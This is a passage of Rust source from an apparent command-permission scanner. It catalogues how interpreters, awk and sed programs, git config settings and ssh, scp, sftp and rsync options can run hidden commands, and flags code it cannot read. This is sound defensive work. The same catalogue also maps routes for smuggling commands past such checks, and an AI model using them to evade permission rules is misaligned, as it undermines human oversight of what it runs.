                "--check",
                "--test",
                "--run",
            ],
            ..interp("", "rC", true)
        },
        "bun" => Interpreter {
            code_words: &["-e", "--eval", "-p", "--print"],
            ..interp("", "", false)
        },
        "php" => Interpreter {
            module: "f",
            info: &[
                "-v",
                "--version",
                "-h",
                "--help",
                "-i",
                "-m",
                "-l",
                "-S",
                "--ini",
                "--rf",
                "--rc",
                "--re",
                "--rz",
                "--ri",
            ],
            ..interp("rBRE", "cdztSFD", true)
        },
        "lua" | "luajit" => Interpreter {
            info: &["-v", "-b", "-h", "--help"],
            ..interp("e", "lj", true)
        },
        "Rscript" => interp("e", "", false),
        "R" => Interpreter {
            code_words: &["--file"],
            ..interp("e", "", true)
        },
        "osascript" => interp("e", "ls", true),
        "tclsh" | "wish" | "jimsh" => Interpreter {
            long_arg: &["-encoding"],
            ..interp("", "", true)
        },
        "expect" => Interpreter {
            module: "f",
            info: &["-v"],
            ..interp("c", "", true)
        },
        "julia" => Interpreter {
            code_words: &["--eval", "--print"],
            ..interp("eE", "pLJCtg", true)
        },
        _ => return None,
    })
}

/// The code an interpreter is given in `cooked` (`-` for its input or a
/// script only known at run time), or `None` when it runs a script file
/// or no code.
fn inline_code(base: &str, raw: &[String], cooked: &[String]) -> Option<String> {
    let n = cooked.len();
    let next = |i: usize| Some(cooked.get(i + 1).cloned().unwrap_or_else(|| "-".into()));
    let lower = base.to_ascii_lowercase();
    if lower == "pwsh" || lower.starts_with("powershell") {
        for (i, w) in cooked.iter().enumerate().skip(1) {
            let w = w.to_ascii_lowercase();
            if [
                "-c",
                "-command",
                "-e",
                "-ec",
                "-enc",
                "-encodedcommand",
                "-cwa",
                "-commandwithargs",
            ]
            .contains(&w.as_str())
            {
                return next(i);
            }
            if ["-f", "-file"].contains(&w.as_str()) || !w.starts_with('-') {
                return None;
            }
        }
        return None;
    }
    if base == "deno" {
        return match cooked.get(1).map(String::as_str) {
            Some("eval") => (2..n)
                .find(|&k| !cooked[k].starts_with('-'))
                .map(|k| cooked[k].clone())
                .or_else(|| Some("-".into())),
            Some("run") if cooked[2..].iter().any(|w| w == "-") => Some("-".into()),
            _ => None,
        };
    }
    let it = interpreter(base)?;
    let mut i = 1;
    while i < n {
        let w = cooked[i].as_str();
        if w == "--" {
            i += 1;
            break;
        }
        if w == "-" {
            return Some("-".into());
        }
        if !w.starts_with('-') {
            break;
        }
        if it.info.contains(&w) {
            return None;
        }
        if it.code_words.contains(&w) {
            return next(i);
        }
        if let Some((name, value)) = w.split_once('=') {
            if it.code_words.contains(&name) {
                return Some(value.to_string());
            }
            i += 1;
            continue;
        }
        if it.long_arg.contains(&w) {
            i += 2;
            continue;
        }
        if w.starts_with("--") {
            i += 1;
            continue;
        }
        let letters: Vec<char> = w[1..].chars().collect();
        let mut k = 0;
        let mut skip_next = false;
        while k < letters.len() {
            let c = letters[k];
            let rest: String = letters[k + 1..].iter().collect();
            if it.code.contains(c) {
                return if rest.is_empty() { next(i) } else { Some(rest) };
            }
            if it.module.contains(c) {
                return None;
            }
            if it.arg.contains(c) {
                skip_next = rest.is_empty();
                break;
            }
            if it.attached.contains(c) {
                break;
            }
            k += 1;
            if it.digits.contains(c) {
                while k < letters.len()
                    && (letters[k].is_ascii_digit()
                        || (c == 'C' && "IOESioDALa".contains(letters[k])))
                {
                    k += 1;
                }
            }
        }
        i += if skip_next { 2 } else { 1 };
    }
    match cooked.get(i) {
        // A script from a pipe or computed at run time.
        Some(script) => computed_source(&raw[i], script).then(|| "-".into()),
        None => it.stdin.then(|| "-".into()),
    }
}

/// What an `awk` or `sed` program does beyond reading and printing.
#[derive(Default)]
struct ProgramEffects {
    /// Shell commands it runs: their text when the program spells it.
    commands: Vec<Option<String>>,
    /// Files it writes: their names when the program spells them.
    writes: Vec<Option<String>>,
    /// It runs code it computes (`system($0)`), or could not be read.
    computed: bool,
}

#[derive(Debug, Clone, PartialEq)]
enum AwkTok {
    Str(String),
    Regex,
    Ident(String),
    Num,
    Punct(&'static str),
    Newline,
}

const AWK_PUNCT: &[&str] = &[
    "|&", "||", "&&", ">>", ">=", "<=", "==", "!=", "!~", "++", "--", "+=", "-=", "*=", "/=", "%=",
    "^=", "**", "|", ">", "<", "(", ")", "{", "}", "[", "]", ";", ",", "!", "~", "+", "-", "*",
    "/", "%", "^", "?", ":", "=", "$", "@",
];

/// The tokens of an awk program, or `None` when it cannot be read.
fn awk_tokens(p: &[char]) -> Option<Vec<AwkTok>> {
    let mut out: Vec<AwkTok> = Vec::new();
    let mut i = 0;
    while i < p.len() {
        let c = p[i];
        match c {
            ' ' | '\t' | '\r' => i += 1,
            '\\' if p.get(i + 1) == Some(&'\n') => i += 2,
            '\n' => {
                out.push(AwkTok::Newline);
                i += 1;
            }
            '#' => {
                while i < p.len() && p[i] != '\n' {
                    i += 1;
                }
            }
            '"' => {
                let mut s = String::new();
                i += 1;
                loop {
                    match p.get(i)? {
                        '"' => break,
                        '\\' => {
                            let e = *p.get(i + 1)?;
                            s.push(match e {
                                'n' => '\n',
                                't' => '\t',
                                e => e,
                            });
                            i += 2;
                        }
                        &ch => {
                            s.push(ch);
                            i += 1;
                        }
                    }
                }
                i += 1;
                out.push(AwkTok::Str(s));
            }
            '/' if matches!(
                out.last(),
                None | Some(AwkTok::Newline) | Some(AwkTok::Regex)
            ) || matches!(out.last(), Some(AwkTok::Punct(t)) if *t != ")" && *t != "]" && *t != "$")
                || matches!(out.last(), Some(AwkTok::Ident(w)) if ["print", "printf", "return", "in", "case"].contains(&w.as_str())) =>
            {
                i += 1;
                let mut bracket = false;
                loop {
                    match p.get(i)? {
                        '\\' => i += 1,
                        '[' => bracket = true,
                        ']' => bracket = false,
                        '/' if !bracket => break,
                        '\n' => return None,
                        _ => {}
                    }
                    i += 1;
                }
                i += 1;
                out.push(AwkTok::Regex);
            }
            c if c.is_ascii_alphabetic() || c == '_' => {
                let start = i;
                while i < p.len() && (p[i].is_ascii_alphanumeric() || p[i] == '_') {
                    i += 1;
                }
                out.push(AwkTok::Ident(p[start..i].iter().collect()));
            }
            c if c.is_ascii_digit() || c == '.' => {
                while i < p.len() && (p[i].is_ascii_alphanumeric() || p[i] == '.') {
                    i += 1;
                }
                out.push(AwkTok::Num);
            }
            _ => {
                let rest: String = p[i..p.len().min(i + 2)].iter().collect();
                let t = AWK_PUNCT.iter().find(|t| rest.starts_with(**t))?;
                i += t.len();
                out.push(AwkTok::Punct(t));
            }
        }
    }
    Some(out)
}

/// What awk program `p` runs and writes: `system("...")`, `"..." |
/// getline`, `print | "..."` and `print > "..."`.
fn awk_effects(p: &str, fx: &mut ProgramEffects) {
    let chars: Vec<char> = p.chars().collect();
    let Some(toks) = awk_tokens(&chars) else {
        fx.computed = true;
        return;
    };
    let ends = |t: Option<&AwkTok>| {
        matches!(
            t,
            None | Some(AwkTok::Newline) | Some(AwkTok::Punct(";" | "}" | ")"))
        )
    };
    // The string at `k` when it is a whole expression ending there.
    let literal_at = |k: usize| match toks.get(k) {
        Some(AwkTok::Str(s)) if ends(toks.get(k + 1)) => Some(s.clone()),
        _ => None,
    };
    let operand = |t: Option<&AwkTok>| {
        matches!(
            t,
            Some(AwkTok::Str(_) | AwkTok::Num | AwkTok::Regex | AwkTok::Ident(_))
                | Some(AwkTok::Punct(")" | "]" | "$" | "++" | "--"))
        )
    };
    let mut print = false;
    let mut parens = 0usize;
    for (k, t) in toks.iter().enumerate() {
        match t {
            AwkTok::Ident(w) if w == "print" || w == "printf" => {
                print = true;
                parens = 0;
            }
            AwkTok::Ident(w) if w == "system" => {
                let arg = match (toks.get(k + 1), toks.get(k + 2), toks.get(k + 3)) {
                    (Some(AwkTok::Punct("(")), Some(AwkTok::Str(s)), Some(AwkTok::Punct(")"))) => {
                        Some(s.clone())
                    }
                    _ => None,
                };
                if arg.is_none() {
                    fx.computed = true;
                }
                fx.commands.push(arg);
            }
            AwkTok::Punct("|" | "|&") => {
                if matches!(toks.get(k + 1), Some(AwkTok::Ident(w)) if w == "getline") {
                    // `"cmd" | getline`: the string before, standing alone.
                    let cmd = match (k.checked_sub(1).map(|j| &toks[j]), k.checked_sub(2)) {
                        (Some(AwkTok::Str(s)), j) if !operand(j.map(|j| &toks[j])) => {
                            Some(s.clone())
                        }
                        _ => None,
                    };
                    if cmd.is_none() {
                        fx.computed = true;
                    }
                    fx.commands.push(cmd);
                } else if print && parens == 0 {
                    let cmd = literal_at(k + 1);
                    if cmd.is_none() {
                        fx.computed = true;
                    }
                    fx.commands.push(cmd);
                } else {
                    fx.computed = true;
                }
            }
            AwkTok::Punct(">" | ">>") if print && parens == 0 => {
                fx.writes.push(literal_at(k + 1));
            }
            AwkTok::Punct("@") => {
                // Gawk's indirect call `@f()` may name `system`.
                if !matches!(toks.get(k + 1), Some(AwkTok::Ident(w)) if ["load", "include", "namespace"].contains(&w.as_str()))
                {
                    fx.computed = true;
                }
            }
            AwkTok::Punct("(") if print => parens += 1,
            AwkTok::Punct(")") if print => {
                if parens == 0 {
                    print = false;
                } else {
                    parens -= 1;
                }
            }
            AwkTok::Punct(";" | "{" | "}") | AwkTok::Newline => print = false,
            _ => {}
        }
    }
}

/// The program operands of `awk` in `cooked`: `(raw, text)` of each
/// program text, or `None` when the program comes from a file.
fn awk_programs<'a>(raw: &'a [String], cooked: &'a [String]) -> Vec<(&'a str, &'a str)> {
    let n = cooked.len();
    let mut programs = Vec::new();
    let mut from_file = false;
    let mut i = 1;
    while i < n {
        let w = cooked[i].as_str();
        if w == "--" {
            i += 1;
            break;
        }
        if !w.starts_with('-') || w == "-" {
            break;
        }
        match w {
            "-f" | "--file" | "-E" | "--exec" | "-i" | "--include" => {
                from_file |= !w.starts_with("-i") && w != "--include";
                i += 2;
            }
            "-e" | "--source" => {
                if i + 1 < n {
                    programs.push((raw[i + 1].as_str(), cooked[i + 1].as_str()));
                }
                i += 2;
            }
            "-F" | "-v" | "-l" | "-W" | "--field-separator" | "--assign" | "--load" => i += 2,
            _ if w.starts_with("--source=") => {
                programs.push((raw[i].as_str(), &w["--source=".len()..]));
                i += 1;
            }
            _ if w.starts_with("--file=") || w.starts_with("--exec=") || w.starts_with("-f") => {
                from_file = true;
                i += 1;
            }
            _ => i += 1,
        }
    }
    if programs.is_empty() && !from_file && i < n {
        programs.push((raw[i].as_str(), cooked[i].as_str()));
    }
    programs
}

/// What sed script `s` does beyond editing text, or `Err` when it cannot be
/// read.
fn sed_effects(s: &str, fx: &mut ProgramEffects) -> Result<(), ()> {
    let c: Vec<char> = s.chars().collect();
    let n = c.len();
    let mut i = 0;
    let to_eol = |i: &mut usize| -> String {
        let start = *i;
        while *i < n && c[*i] != '\n' {
            *i += 1;
        }
        c[start..*i].iter().collect()
    };
    // Past a regex delimited by `d` from `i` (after the opening delimiter).
    let regex = |i: &mut usize, d: char| -> Result<(), ()> {
        let mut bracket = false;
        while *i < n {
            match c[*i] {
                '\\' => *i += 1,
                '[' if !bracket && d != '[' => bracket = true,
                ']' if bracket => bracket = false,
                ch if ch == d && !bracket => {
                    *i += 1;
                    return Ok(());
                }
                _ => {}
            }
            *i += 1;
        }
        Err(())
    };
    let address = |i: &mut usize| -> Result<(), ()> {
        match c.get(*i) {
            Some('/') => {
                *i += 1;
                regex(i, '/')?;
                while matches!(c.get(*i), Some('I' | 'M')) {
                    *i += 1;
                }
            }
            Some('\\') => {
                let d = *c.get(*i + 1).ok_or(())?;
                *i += 2;
                regex(i, d)?;
                while matches!(c.get(*i), Some('I' | 'M')) {
                    *i += 1;
                }
            }
            Some('$') => *i += 1,
            Some(ch) if ch.is_ascii_digit() => {
                while c
                    .get(*i)
                    .is_some_and(|ch| ch.is_ascii_digit() || *ch == '~')
                {
                    *i += 1;
                }
            }
            _ => {}
        }
        Ok(())
    };
    loop {
        while i < n && (c[i].is_whitespace() || c[i] == ';') {
            i += 1;
        }
        if i >= n {
            return Ok(());
        }
        if c[i] == '#' {
            to_eol(&mut i);
            continue;
        }
        address(&mut i)?;
        while c.get(i).is_some_and(|ch| *ch == ' ' || *ch == '\t') {
            i += 1;
        }
        if c.get(i) == Some(&',') {
            i += 1;
            while c.get(i).is_some_and(|ch| *ch == ' ') {
                i += 1;
            }
            if matches!(c.get(i), Some('+' | '~')) {
                i += 1;
            }
            address(&mut i)?;
        }
        while c
            .get(i)
            .is_some_and(|ch| *ch == ' ' || *ch == '\t' || *ch == '!')
        {
            i += 1;
        }
        let Some(&cmd) = c.get(i) else {
            return Err(());
        };
        i += 1;
        match cmd {
            // A block's commands may follow its brace directly.
            '{' | '}' => continue,
            '=' | 'd' | 'D' | 'g' | 'G' | 'h' | 'H' | 'x' | 'n' | 'N' | 'p' | 'P' | 'z' | 'F' => {}
            'l' | 'L' | 'q' | 'Q' => {
                while c.get(i).is_some_and(|ch| *ch == ' ' || ch.is_ascii_digit()) {
                    i += 1;
                }
            }
            ':' | 'b' | 't' | 'T' | 'v' => {
                while i < n && c[i] != '\n' && c[i] != ';' && (cmd == ':' || c[i] != '}') {
                    i += 1;
                }
            }
            'a' | 'i' | 'c' => {
                // Text to the end of the line, continued by a backslash.
                while i < n && c[i] != '\n' {
                    if c[i] == '\\' {
                        i += 1;
                    }
                    i += 1;
                }
            }
            'r' | 'R' => {
                to_eol(&mut i);
            }
            'w' | 'W' => {
                let file = to_eol(&mut i);
                fx.writes.push(Some(file.trim_start().to_string()));
            }
            'e' => {
                // `e` alone runs the pattern space, `e cmd` the command.
                let code = to_eol(&mut i);
                let code = code.trim();
                if code.is_empty() {
                    fx.computed = true;
                    fx.commands.push(None);
                } else {
                    fx.commands.push(Some(code.to_string()));
                }
            }
            's' | 'y' => {
                let d = *c.get(i).ok_or(())?;
                if d == '\n' || d == '\\' {
                    return Err(());
                }
                i += 1;
                regex(&mut i, d)?;
                regex(&mut i, d)?;
                if cmd == 's' {
                    while let Some(&f) = c.get(i) {
                        match f {
                            'g' | 'p' | 'i' | 'I' | 'm' | 'M' => i += 1,
                            f if f.is_ascii_digit() => i += 1,
                            'e' => {
                                // Runs the result as a command.
                                fx.computed = true;
                                fx.commands.push(None);
                                i += 1;
                            }
                            'w' => {
                                i += 1;
                                let file = to_eol(&mut i);
                                fx.writes.push(Some(file.trim_start().to_string()));
                            }
                            _ => break,
                        }
                    }
                }
            }
            _ => return Err(()),
        }
        while c.get(i).is_some_and(|ch| *ch == ' ' || *ch == '\t') {
            i += 1;
        }
        match c.get(i) {
            None | Some(';' | '\n' | '}' | '#') => {}
            _ => return Err(()),
        }
    }
}

/// The scripts of a `sed` command in `cooked`, as `(raw, text)`, read as
/// GNU sed does (`bsd: false`: options anywhere, `-i` alone takes no
/// suffix) or as BSD sed does (`-i SUFFIX`, options first). `None` when
/// a script comes from a file the run computes, or `--sandbox` turns off
/// commands and writes (an empty list).
fn sed_scripts<'a>(
    raw: &'a [String],
    cooked: &'a [String],
    bsd: bool,
) -> Option<Vec<(&'a str, &'a str)>> {
    let n = cooked.len();
    let mut scripts = Vec::new();
    let mut operands = Vec::new();
    let mut from_file = false;
    let mut i = 1;
    let mut ended = false;
    while i < n {
        let w = cooked[i].as_str();
        if ended || !w.starts_with('-') || w == "-" {
            if bsd {
                operands.extend(i..n);
                break;
            }
            operands.push(i);
            i += 1;
            continue;
        }
        if w == "--" {
            ended = true;
            i += 1;
            continue;
        }
        if w == "--sandbox" {
            return Some(Vec::new());
        }
        if let Some(long) = w.strip_prefix("--") {
            let (name, value) = long
                .split_once('=')
                .map_or((long, None), |(a, b)| (a, Some(b)));
            match (name, value) {
                ("expression", Some(_)) => scripts.push((raw[i].as_str(), value.unwrap())),
                ("expression", None) if i + 1 < n => {
                    scripts.push((raw[i + 1].as_str(), cooked[i + 1].as_str()));
                    i += 1;
                }
                ("file", v) => {
                    let f = v.or(cooked.get(i + 1).map(String::as_str)).unwrap_or("-");
                    if v.is_none() {
                        i += 1;
                    }
                    if computed_source(f, f) {
                        return None;
                    }
                    from_file = true;
                }
                ("line-length", None) => i += 1,
                _ => {}
            }
            i += 1;
            continue;
        }
        let letters: Vec<char> = w[1..].chars().collect();
        for (k, &ch) in letters.iter().enumerate() {
            let rest: String = letters[k + 1..].iter().collect();
            match ch {
                'e' | 'f' | 'l' => {
                    let (r, text) = if rest.is_empty() {
                        i += 1;
                        match (raw.get(i), cooked.get(i)) {
                            (Some(r), Some(t)) => (r.as_str(), t.as_str()),
                            _ => break,
                        }
                    } else {
                        (raw[i].as_str(), &w[w.len() - rest.len()..])
                    };
                    if ch == 'e' {
                        scripts.push((r, text));
                    } else if ch == 'f' {
                        if computed_source(r, text) {
                            return None;
                        }
                        from_file = true;
                    }
                    break;
                }
                'i' | 'I' if bsd => {
                    if rest.is_empty() {
                        i += 1;
                    }
                    break;
                }
                'i' => break,
                _ => {}
            }
        }
        i += 1;
    }
    if scripts.is_empty() && !from_file {
        if let Some(&k) = operands.first() {
            scripts.push((raw[k].as_str(), cooked[k].as_str()));
        }
    }
    Some(scripts)
}

/// Checks what an `awk` or `sed` program runs and writes. Program text the
/// run computes is code the scan cannot read: the inline-code marker.
fn program_effects(
    base: &str,
    raw: &[String],
    cooked: &[String],
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let mut fx = ProgramEffects::default();
    let mut unreadable = false;
    if base == "sed" {
        for bsd in [false, true] {
            let Some(scripts) = sed_scripts(raw, cooked, bsd) else {
                unreadable = true;
                continue;
            };
            for (r, text) in scripts {
                shared.charge(text.len());
                if !is_static_word(r) {
                    unreadable = true;
                    continue;
                }
                // BSD's reading of a GNU `-i` takes a file name as the
                // script: one sed refuses, so only the GNU reading counts.
                if sed_effects(text, &mut fx).is_err() && !bsd && text.contains(['e', 'w', 'W']) {
                    unreadable = true;
                }
            }
        }
    } else {
        for (r, text) in awk_programs(raw, cooked) {
            shared.charge(text.len());
            if !is_static_word(r) {
                unreadable = true;
                continue;
            }
            awk_effects(text, &mut fx);
        }
    }
    if unreadable || fx.computed {
        let code = awk_programs(raw, cooked)
            .first()
            .map(|(_, t)| t.to_string())
            .filter(|_| base != "sed")
            .unwrap_or_else(|| cooked[1..].join(" "));
        push_code_marker(&cooked[0], &code, out);
    }
    // Both readings of a sed command often find the same things.
    let mut seen = std::collections::HashSet::new();
    for cmd in fx.commands.into_iter().flatten() {
        if seen.insert(cmd.clone()) {
            run_string(&cmd, cwd, shared, depth, out)?;
        }
    }
    let program = cooked.join(" ");
    let mut seen = std::collections::HashSet::new();
    for w in fx.writes {
        if seen.insert(w.clone()) {
            push_literal_write(out, w.as_deref(), &program);
        }
    }
    Ok(())
}

/// Records code the scan cannot read, run by `name`: checked as the
/// resource `code:NAME CODE`, which only a rule such as `code:python *`
/// (or `*`) allows.
fn push_code_marker(name: &str, code: &str, out: &mut Analysis) {
    let base = name.rsplit('/').next().unwrap_or(name);
    let resource = format!("code:{base} {code}");
    let save = format!("code:{base} *");
    if !out.delegated.iter().any(|(r, _)| *r == resource) {
        out.delegated.push((resource, save));
    }
}

/// `git -c` settings and subcommand options that run a program.
fn git_effects(
    raw: &[String],
    cooked: &[String],
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let n = cooked.len();
    let mut i = 1;
    while i < n {
        let w = cooked[i].as_str();
        match w {
            "-c" => {
                if i + 1 < n {
                    git_setting(&raw[i + 1], &cooked[i + 1], cwd, shared, depth, out)?;
                }
                i += 2;
            }
            "--config-env" => {
                if let Some(kv) = cooked.get(i + 1) {
                    git_env_setting(kv, out);
                }
                i += 2;
            }
            _ if w.starts_with("--config-env=") => {
                git_env_setting(&w["--config-env=".len()..], out);
                i += 1;
            }
            // Git's own programs from another directory.
            _ if w.starts_with("--exec-path=") => {
                mark_dynamic(out, "dynamic-execution");
                i += 1;
            }
            "-C" | "--git-dir" | "--work-tree" | "--namespace" | "--super-prefix"
            | "--list-cmds" | "--attr-source" => i += 2,
            _ if w.starts_with('-') => i += 1,
            _ => break,
        }
    }
    let Some(sub) = cooked.get(i).map(String::as_str) else {
        return Ok(());
    };
    let args = i + 1;
    // Where the value of a long option (or `short`) given as the next word
    // is, for every use.
    let values = |long: &[&str], short: Option<&str>| -> Vec<usize> {
        (args..n.saturating_sub(1))
            .filter(|&k| long.contains(&cooked[k].as_str()) || short == Some(cooked[k].as_str()))
            .map(|k| k + 1)
            .collect()
    };
    let attached = |long: &[&str]| -> Vec<(usize, String)> {
        (args..n)
            .filter_map(|k| {
                long.iter().find_map(|l| {
                    cooked[k]
                        .strip_prefix(l)
                        .and_then(|v| v.strip_prefix('='))
                        .map(|v| (k, v.to_string()))
                })
            })
            .collect()
    };
    let mut code: Vec<(usize, Option<String>)> = Vec::new();
    let mut check = |long: &[&str], short: Option<&str>| {
        for k in values(long, short) {
            code.push((k, None));
        }
        for (k, v) in attached(long) {
            code.push((k, Some(v)));
        }
    };
    match sub {
        "rebase" => check(&["--exec"], Some("-x")),
        "difftool" => check(&["--extcmd"], Some("-x")),
        "fetch" | "pull" | "clone" | "ls-remote" | "archive" | "push" | "remote" => check(
            &["--upload-pack", "--receive-pack", "--exec"],
            (sub == "clone" || sub == "ls-remote").then_some("-u"),
        ),
        "filter-branch" => check(
            &[
                "--env-filter",
                "--tree-filter",
                "--index-filter",
                "--parent-filter",
                "--msg-filter",
                "--commit-filter",
                "--tag-name-filter",
            ],
            None,
        ),
        "send-email" => check(&["--sendmail-cmd"], None),
        "grep" => {
            for (k, w) in cooked.iter().enumerate().skip(args) {
                if let Some(v) = w
                    .strip_prefix("--open-files-in-pager=")
                    .or_else(|| w.strip_prefix("-O").filter(|v| !v.is_empty()))
                {
                    code.push((k, Some(v.to_string())));
                }
            }
        }
        "bisect" if cooked.get(args).is_some_and(|w| w == "run") => {
            // `git bisect run cmd args...`.
            if args + 1 < n {
                let words = &cooked[args + 1..];
                let resource = words.join(" ");
                out.delegated
                    .push((resource.clone(), save_pattern(words, &resource)));
                delegate(&raw[args + 1..], words, cwd, shared, depth + 1, out)?;
            }
        }
        "submodule" => {
            if let Some(f) = (args..n).find(|&k| cooked[k] == "foreach") {
                let mut k = f + 1;
                while k < n && cooked[k].starts_with('-') {
                    k += 1;
                }
                if k < n {
                    let text = cooked[k..].join(" ");
                    let ok = raw[k..].iter().all(|w| is_static_word(w));
                    shell_code(ok.then_some(text.as_str()), cwd, shared, depth, out)?;
                }
            }
        }
        _ => {}
    }
    for (k, value) in code {
        let text = value.unwrap_or_else(|| cooked[k].clone());
        shell_code(
            is_static_word(&raw[k]).then_some(text.as_str()),
            cwd,
            shared,
            depth,
            out,
        )?;
    }
    Ok(())
}

/// A `git -c key=value` setting (`raw` as written).
fn git_setting(
    raw: &str,
    kv: &str,
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let (key, value) = kv.split_once('=').unwrap_or((kv, "true"));
    let key = key.to_ascii_lowercase();
    let parts: Vec<&str> = key.split('.').collect();
    let (section, name) = (parts[0], *parts.last().unwrap_or(&""));
    let static_value = is_static_word(raw).then_some(value);
    // Settings naming files or directories of more settings or hooks.
    // `protocol.ext.allow` lets `ext::` URLs run commands.
    let indirect = matches!(section, "include" | "includeif")
        || key == "core.hookspath"
        || key == "protocol.ext.allow"
        || (key == "protocol.allow" && value == "always");
    if indirect {
        mark_dynamic(out, "dynamic-execution");
        return Ok(());
    }
    let runs = match section {
        "alias" => {
            // `!cmd` runs a shell command, anything else a git command.
            return match static_value {
                Some(v) if v.starts_with('!') => shell_code(Some(&v[1..]), cwd, shared, depth, out),
                Some(v) => shell_code(Some(&format!("git {v}")), cwd, shared, depth, out),
                None => shell_code(None, cwd, shared, depth, out),
            };
        }
        "core" => matches!(
            name,
            "pager"
                | "editor"
                | "sshcommand"
                | "askpass"
                | "fsmonitor"
                | "gitproxy"
                | "alternaterefscommand"
        ),
        "pager" | "sequence" => true,
        "diff" => name == "external" || name == "command" || name == "textconv",
        "merge" => name == "driver",
        "filter" => matches!(name, "clean" | "smudge" | "process"),
        "credential" => name == "helper",
        "gpg" => name == "program",
        "uploadpack" => name == "packobjectshook",
        "remote" => name == "uploadpack" || name == "receivepack",
        "difftool" | "mergetool" | "man" | "browser" => name == "cmd" || name == "path",
        "web" => name == "browser",
        "interactive" => name == "difffilter",
        "sendemail" => name == "sendmailcmd" || (name == "smtpserver" && value.starts_with('/')),
        _ => false,
    };
    if !runs {
        return Ok(());
    }
    if key == "core.fsmonitor" && matches!(value, "true" | "false") {
        return Ok(());
    }
    let value = static_value.map(|v| {
        if section == "credential" && !v.is_empty() && !v.starts_with('!') && !v.starts_with('/') {
            format!("git credential-{v}")
        } else {
            v.trim_start_matches('!').to_string()
        }
    });
    shell_code(value.as_deref(), cwd, shared, depth, out)
}

/// `git --config-env key=VAR`: a setting whose value comes from the
/// environment, unknown to the scan.
fn git_env_setting(kv: &str, out: &mut Analysis) {
    let key = kv.split('=').next().unwrap_or(kv).to_ascii_lowercase();
    let harmless = [
        "user.",
        "color.",
        "advice.",
        "init.",
        "author.",
        "committer.",
    ]
    .iter()
    .any(|p| key.starts_with(p));
    if !harmless {
        mark_dynamic(out, "dynamic-execution");
    }
}

/// Commands `ssh`, `scp`, `sftp` and `rsync` run: a `ProxyCommand` or
/// `-e`/`-S` program here, and the remote command there.
fn remote_effects(
    base: &str,
    raw: &[String],
    cooked: &[String],
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let n = cooked.len();
    let value_of = |k: usize, rest: &str| -> Option<(usize, String)> {
        if rest.is_empty() {
            (k + 1 < n).then(|| (k + 1, cooked[k + 1].clone()))
        } else {
            Some((k, rest.to_string()))
        }
    };
    let static_at = |k: usize| is_static_word(&raw[k]);
    if base == "rsync" {
        let mut k = 1;
        while k < n {
            let w = cooked[k].as_str();
            if w == "--" {
                break;
            }
            if let Some(v) = w.strip_prefix("--rsh=") {
                shell_code(static_at(k).then_some(v), cwd, shared, depth, out)?;
            } else if w == "--rsh" && k + 1 < n {
                shell_code(
                    static_at(k + 1).then_some(&cooked[k + 1]),
                    cwd,
                    shared,
                    depth,
                    out,
                )?;
                k += 1;
            } else if let Some(v) = w.strip_prefix("--rsync-path=") {
                remote_code(static_at(k).then_some(v), cwd, shared, depth, out)?;
            } else if w.len() > 1 && w.starts_with('-') && !w.starts_with("--") {
                let letters = &w[1..];
                for (j, ch) in letters.char_indices() {
                    if "BfMT@".contains(ch) {
                        break;
                    }
                    if ch == 'e' {
                        if let Some((at, v)) = value_of(k, &letters[j + 1..]) {
                            shell_code(static_at(at).then_some(&v), cwd, shared, depth, out)?;
                            k = at;
                        }
                        break;
                    }
                }
            }
            k += 1;
        }
        return Ok(());
    }
    let with_arg = match base {
        "ssh" => "BbcDEeFIiJLlmOoPpQRSWw",
        "scp" => "DFJPSXcilo",
        _ => "BbcDFiJlloPRSsX", // sftp
    };
    let mut host = false;
    let mut no_command = base != "ssh";
    let mut k = 1;
    while k < n {
        let w = cooked[k].as_str();
        if w == "--" {
            k += if host { 1 } else { 2 };
            host = true;
            break;
        }
        if w.len() > 1 && w.starts_with('-') {
            let letters = &w[1..];
            let mut next = k + 1;
            for (j, ch) in letters.char_indices() {
                if "NsGVQW".contains(ch) && base == "ssh" {
                    no_command = true;
                }
                if !with_arg.contains(ch) {
                    continue;
                }
                let Some((at, v)) = value_of(k, &letters[j + 1..]) else {
                    break;
                };
                next = at + 1;
                match ch {
                    'o' => {
                        let (key, value) = v
                            .split_once(['=', ' ', '\t'])
                            .map_or((v.as_str(), ""), |(a, b)| {
                                (a, b.trim_start_matches(['=', ' ', '\t']))
                            });
                        let key = key.to_ascii_lowercase();
                        if value.eq_ignore_ascii_case("none") {
                        } else if ["proxycommand", "localcommand", "knownhostscommand"]
                            .contains(&key.as_str())
                        {
                            shell_code(static_at(at).then_some(value), cwd, shared, depth, out)?;
                        } else if key == "remotecommand" {
                            remote_code(static_at(at).then_some(value), cwd, shared, depth, out)?;
                        }
                    }
                    // A program run here in place of `ssh` (scp, sftp),
                    // sftp's local server.
                    'S' | 'D' if base != "ssh" => {
                        shell_code(static_at(at).then_some(&v), cwd, shared, depth, out)?;
                    }
                    // sftp batch commands, which may run local `!cmd`s.
                    'b' if base == "sftp" && computed_source(&raw[at], &v) => {
                        mark_dynamic(out, "dynamic-execution");
                    }
                    'O' if base == "ssh" => no_command = true,
                    _ => {}
                }
                break;
            }
            k = next;
            continue;
        }
        if !host {
            host = true;
            k += 1;
            continue;
        }
        break;
    }
    if !no_command && k < n {
        let text = cooked[k..].join(" ");
        let ok = raw[k..].iter().all(|w| is_static_word(w));
        remote_code(ok.then_some(text.as_str()), cwd, shared, depth, out)?;
    } else if !no_command && host {
        // With no command the remote shell runs what it reads.
        mark_dynamic(out, "dynamic-execution");
    }
    Ok(())
}

/// Shell code another machine runs (`ssh host cmd`): its commands are
/// checked like local ones, so a rule denying `rm *` denies `ssh host rm
/// x`, but its directories and files are the remote machine's.
fn remote_code(
    code: Option<&str>,
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let Some(code) = code else {
        mark_dynamic(out, "dynamic-execution");
        return Ok(());
    };
    let mut inner = Analysis::default();
    run_string(code, cwd, shared, depth, &mut inner)?;
    out.delegated.extend(inner.delegated);
    out.deny_only.extend(inner.deny_only);
    if let Some(d) = inner.dynamic {
        mark_dynamic(out, &d);
    }
    Ok(())
}

/// An `env` operand that sets a variable: `NAME=value` with a name (`=rm`
/// is Zsh's path of `rm`, a command).
fn env_assignment(w: &str) -> bool {
    !w.starts_with('-') && w.find('=').is_some_and(|i| i > 0)
}

/// `name=value` or `name+=value`.
